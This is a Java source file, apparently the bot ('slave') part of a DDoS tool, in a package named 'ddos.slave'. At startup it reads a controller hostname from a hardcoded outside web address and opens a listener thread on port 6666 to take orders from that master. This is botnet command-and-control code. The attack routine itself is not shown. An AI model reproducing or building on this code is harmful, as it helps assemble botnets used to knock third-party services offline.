/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos.slave;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author bruno
 */
public class Slave {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        System.out.println("Slave - MAIN - START");
        try {
            URL url = new URL("http://muller.bru.free.fr/master.html");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String hostname = br.readLine();
            System.out.println("Master hostname: " + hostname);
            
            new Thread(new MasterListener(hostname, 6666)).start();
            
            
            
        } catch (Exception ex) {
            Logger.getLogger(Slave.class.getName()).log(Level.SEVERE, null, ex);
        }
         finally {
           System.out.println("Slave - MAIN - END");
       }
    }
}
